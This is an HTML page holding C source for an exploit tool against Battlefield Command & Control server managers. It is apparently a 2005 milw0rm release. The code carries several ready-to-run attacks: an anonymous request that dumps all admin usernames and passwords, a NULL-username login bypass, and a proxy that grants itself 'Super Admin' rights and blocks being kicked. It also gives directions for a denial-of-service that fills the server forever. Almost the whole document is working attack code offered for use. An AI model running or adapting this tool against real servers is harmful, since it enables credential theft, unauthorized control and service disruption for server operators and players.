<html>
<head>
<title>Battlefield (BFCC/BFVCC/BF2CC) Login Bypass/Pass Stealer/DoS Exploit </title>
<pre>
/*

by Luigi Auriemma

http://aluigi.altervista.org/fakep/tcpfp.zip

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdarg.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = &quot;Interrupted system call&quot;; break;
        case 10009: error = &quot;Bad file number&quot;; break;
        case 10013: error = &quot;Permission denied&quot;; break;
        case 10014: error = &quot;Bad address&quot;; break;
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
        case 10024: error = &quot;Too many open files&quot;; break;
        case 10035: error = &quot;Operation would block&quot;; break;
        case 10036: error = &quot;Operation now in progress&quot;; break;
        case 10037: error = &quot;Operation already in progress&quot;; break;
        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
        case 10039: error = &quot;Destination address required&quot;; break;
        case 10040: error = &quot;Message too long&quot;; break;
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
        case 10042: error = &quot;Bad protocol option&quot;; break;
        case 10043: error = &quot;Protocol not supported&quot;; break;
        case 10044: error = &quot;Socket type not supported&quot;; break;
        case 10045: error = &quot;Operation not supported on socket&quot;; break;
        case 10046: error = &quot;Protocol family not supported&quot;; break;
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
        case 10048: error = &quot;Address already in use&quot;; break;
        case 10049: error = &quot;Can't assign requested address&quot;; break;
        case 10050: error = &quot;Network is down&quot;; break;
        case 10051: error = &quot;Network is unreachable&quot;; break;
        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
        case 10053: error = &quot;Software caused connection abort&quot;; break;
        case 10054: error = &quot;Connection reset by peer&quot;; break;
        case 10055: error = &quot;No buffer space available&quot;; break;
        case 10056: error = &quot;Socket is already connected&quot;; break;
        case 10057: error = &quot;Socket is not connected&quot;; break;
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
        case 10059: error = &quot;Too many references, can't splice&quot;; break;
        case 10060: error = &quot;Connection timed out&quot;; break;
        case 10061: error = &quot;Connection refused&quot;; break;
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
        case 10063: error = &quot;File name too long&quot;; break;
        case 10064: error = &quot;Host is down&quot;; break;
        case 10065: error = &quot;No Route to Host&quot;; break;
        case 10066: error = &quot;Directory not empty&quot;; break;
        case 10067: error = &quot;Too many processes&quot;; break;
        case 10068: error = &quot;Too many users&quot;; break;
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
        case 10070: error = &quot;Stale NFS file handle&quot;; break;
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
        case 11001: error = &quot;Host not found&quot;; break;
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
    exit(1);
}

// inserted winerr.h /str0ke

    #define close   closesocket
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netinet/in.h&gt;
    #include &lt;netdb.h&gt;
#endif



#define VER         &quot;0.1&quot;
#define PORT        5555
#define MYPORT      3333
#define BUFFSZ      8192
#define DEL         0x1e
#define END         &quot;\x00\x40\x40\x00&quot;



void proxy(int sock, u_char *buff, int size);
int check_drop(u_char *data);
void show_bfcc(u_char *buff, int len);
void send_bfcc(int sock, ...);
int recv_bfcc(int sock, u_char *buff, int size);
u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            attack,
            scan = 3;
    u_short port = PORT;
    u_char  buff[BUFFSZ];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;BFCommand &amp; Control login bypass &quot;VER&quot;\n&quot;
        &quot;  BFCC  &lt;= 1.22_A\n&quot;
        &quot;  BFVCC &lt;= 2.14_B\n&quot;
        &quot;  BFVCCDaemon is NOT vulnerable\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 3) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;attack&gt; &lt;host&gt; [port(%hu)]\n&quot;
            &quot;\n&quot;
            &quot;Attack:\n&quot;
            &quot; 1 = passwords stoler, sends the GetUserAccounts anonymously and gets all the\n&quot;
            &quot;     usernames and passwords in the server manager (bug A)\n&quot;
            &quot; 2 = checks if is possible to bypass the login using a NULL username (bug B)\n&quot;
            &quot; 3 = proxy server to use with BFC3 and BFVC3 clients which grants access to any\n&quot;
            &quot;     vulnerable server in total anonymity and unbootable (bug A and C)\n&quot;
            &quot; 4 = explanation of how test bug D, server full forever\n&quot;
            &quot;\n&quot;
            &quot; Note: The default port of BFCC is 4555 while is 5555 for BFVCC (default)\n&quot;
            &quot;       This tool has been written to be compatible with BFVCC so only attack 1\n&quot;
            &quot;       and 4 can be used with success versus BFCC using this specific tool\n&quot;
            &quot;\n&quot;, argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);
    if((attack &lt; 1) || (attack &gt; 4)) {
        fputs(&quot;\nError: you must choose a number between the range of available attacks\n\n&quot;, stdout);
        exit(1);
    }
    if(attack == 4) {
        fputs(&quot;\n&quot;
            &quot;Download the tool \&quot;Generic TCP Fake Players DoS\&quot; from here:\n&quot;
            &quot;\n&quot;
            &quot;  http://aluigi.altervista.org/fakep/tcpfp.zip\n&quot;
            &quot;\n&quot;
            &quot;Launch it with the following arguments\n&quot;
            &quot;\n&quot;
            &quot;  tcpfp -r full 127.0.0.1 5555\n&quot;
            &quot;\n&quot;
            &quot;substituiting 127.0.0.1 and 5555 with the server and port of the server you\n&quot;
            &quot;want to test.\n&quot;
            &quot;\n&quot;, stdout);
        return(0);
    }

    if(argc &gt; 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd &lt; 0) std_err();

    while(scan--) {
        printf(&quot;- target   %s : %hu\n&quot;,
        inet_ntoa(peer.sin_addr), port);
        len = connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer));
        if(!len) break;
        fputs(&quot;  no service available on this port\n&quot;, stdout);
        peer.sin_port = htons(++port);
    }
    if(len &lt; 0) std_err();

    if(attack == 1) {
        fputs(&quot;- receive server's informations:\n&quot;, stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

        fputs(&quot;- send anonymous GetUserAccounts commands\n&quot;, stdout);
        send_bfcc(sd, &quot;GetUserAccounts&quot;, NULL);

        fputs(
            &quot;- receive full list of admin usernames and passwords\n&quot;
            &quot;  Username   Password:\n&quot;, stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

    } else if(attack == 2) {
        fputs(&quot;- receive server's informations:\n&quot;, stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

        fputs(&quot;- send login command with NULL nickname\n&quot;, stdout);
        send_bfcc(sd,
            &quot;login&quot;,
            &quot;\0&quot;,   // BUG exploited here
            &quot;password&quot;,
            &quot;username&quot;,
            &quot;???&quot;,
            &quot;&quot;,
            NULL);

        fputs(&quot;- check for success message:\n&quot;, stdout);
        len = recv_bfcc(sd, buff, BUFFSZ);
        show_bfcc(buff, len);

    } else if(attack == 3) {
        proxy(sd, buff, BUFFSZ);
    }

    close(sd);
    free(buff);
    return(0);
}



void proxy(int sock, u_char *buff, int size) {
    struct  sockaddr_in peer;
    fd_set  readset;
    int     sdl,
            sda,
            on = 1,
            len,
            psz,
            selsock;

    peer.sin_addr.s_addr = INADDR_ANY;
    peer.sin_port        = htons(MYPORT);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(peer);

    printf(&quot;- bind port %hu\n&quot;, MYPORT);

    sdl = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sdl &lt; 0) std_err();
    if(setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on))
      &lt; 0) std_err();
    if(bind(sdl, (struct sockaddr *)&amp;peer, sizeof(peer))
      &lt; 0) std_err();
    if(listen(sdl, SOMAXCONN)
      &lt; 0) std_err();

    printf(&quot;- launch BFC3 or BFVC3 and sets %s as server and %hu as port\n&quot;,
        &quot;127.0.0.1&quot;, MYPORT);

    sda = accept(sdl, (struct sockaddr *)&amp;peer, &amp;psz);
    if(sda &lt; 0) std_err();

    printf(&quot;- connected\n&quot;);

    send_bfcc(sda,  // enable everything
        &quot;master&quot;,
        &quot;null/null/null/0/Map_True/&quot;
        &quot;Action-Warn&quot;                           &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Kick&quot;                           &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Insta-Kick (No Reason)&quot;         &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Ban&quot;                            &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Insta-Ban (No Reason)&quot;          &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Remove Ban&quot;                     &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Clear Banlist&quot;                  &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Force to Other Team&quot;            &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Kill Player&quot;                    &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Send Message to Server&quot;         &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Game-Pause&quot;                            &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Game-Toggle Auto-Balance&quot;              &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;Action-Request PB Screenshot&quot;          &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Maps Change Maps&quot;                &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Maps Change 2 Map NOT in &quot;       &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Maps Restart Map&quot;                &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Maps Set Next Map&quot;               &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Admin Change Server Settings&quot;    &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Admin Change FF Settings&quot;        &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Admin Change Misc Settings&quot;      &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVC3-Admin Change Voting Settings&quot;    &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;USERS-Access User Accounts&quot;            &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;USERS-Edit User Profiles&quot;              &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;USERS-Create User&quot;                     &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;USERS-Edit User&quot;                       &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;USERS-Delete User&quot;                     &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVCC-Access Manager Control Panel&quot;    &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVCC-Access to Auto Admin Settings&quot;   &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVCC-Load Manager Profiles&quot;           &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVCC-Save Changes to Profiles&quot;        &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVCC-Create Manager Profiles&quot;         &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;BFVCC-Delete Manager Profiles&quot;         &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;CC-Access the CC Editor&quot;               &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;CC-Save Changes to CC Profiles&quot;        &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;CC-Create new CC Profiles&quot;             &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;CC-Delete CC Profile&quot;                  &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;CC-Change a Maps CC Profile&quot;           &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;
        &quot;PB-Edit PB Config Files&quot;               &quot;\xff&quot; &quot;1&quot; &quot;\xff&quot;,
        &quot;15567&quot;,                                // default server port (useless)
        &quot;admin&quot;                                 &quot;\xff&quot;, // username    (useless)
        &quot;True&quot;,
        &quot;Super Admin&quot;,                          // profile
        &quot;0&quot;,
        NULL);

    selsock = ((sock &gt; sda) ? sock : sda) + 1;

    for(;;) {
        FD_ZERO(&amp;readset);
        FD_SET(sock, &amp;readset);
        FD_SET(sda, &amp;readset);
        if(select(selsock, &amp;readset, NULL, NULL, NULL)
          &lt; 0) std_err();

        if(FD_ISSET(sda, &amp;readset)) {
            len = recv_bfcc(sda, buff, size);
            fwrite(buff, len, 1, stdout);

            if(check_drop(buff)) continue;

            len = send(sock, buff, len, 0);
            if(len &lt; 0) std_err();
        }

        if(FD_ISSET(sock, &amp;readset)) {
            len = recv_bfcc(sock, buff, size);
            fwrite(buff, len, 1, stdout);

            if(check_drop(buff)) continue;

            len = send(sda, buff, len, 0);
            if(len &lt; 0) std_err();
        }
    }

    close(sda);
    close(sdl);
}



int check_drop(u_char *cmd) {
    int     i;
    u_char  *p,
            *drop[] = {
                &quot;login&quot;,
                &quot;Boot&quot;,
                &quot;loginfailed&quot;,
                NULL
            };

    p = strchr(cmd, DEL);
    if(!p) {
        p = strchr(cmd, END[0]);
        if(!p) return(0);
    }

    for(i = 0; drop[i]; i++) {
        if(!strncmp(cmd, drop[i], p - cmd)) return(1);
    }

    return(0);
}



void show_bfcc(u_char *buff, int len) {
    u_char  *p,
            *l,
            *limit = buff + len;

    for(p = buff; p &lt; limit; p = l + 1) {
        for(l = p; *l != DEL; l++) {
            if(!memcmp(l, END, 4)) return;
            if(!memcmp(l, &quot;|;|&quot;, 3)) {
                if(*(l - 1) == '\t') *(l - 1) = ' ';
                memcpy(l, &quot;\n  &quot;, 3);
            }
        }
        *l = 0;
        printf(&quot;  %s\n&quot;, p);
    }
}



void send_bfcc(int sock, ...) { // final NULL required
    va_list ap;
    int     len;
    u_char  *s;

    va_start(ap, sock);

    s = va_arg(ap, u_char *);
    if(s) {
        for(;;) {
            len = strlen(s);
            if(!len) len++;
            send(sock, s, len, 0);
            s = va_arg(ap, u_char *);
            if(!s) break;
            send(sock, &quot;\x1e&quot;, 1, 0);
        }
    }

    va_end(ap);

    send(sock, END, 4, 0);
}



int recv_bfcc(int sock, u_char *buff, int size) {
    int     len = 0;

        // one command at time, slower but better
    while(len &lt; size) {
        if(recv(sock, buff + len, 1, 0) &lt;= 0) {
            fputs(&quot;\nError: connection interrupted\n\n&quot;, stdout);
            exit(1);
        }
        len++;
        if(!memcmp(buff + len - 4, END, 4)) break;
    }

    if(len == size) {
        fputs(&quot;\nError: command too long\n\n&quot;, stdout);
        exit(1);
    }

    return(len);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_int *)(hp-&gt;h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif

// milw0rm.com [2005-08-29]
</pre>
</html>

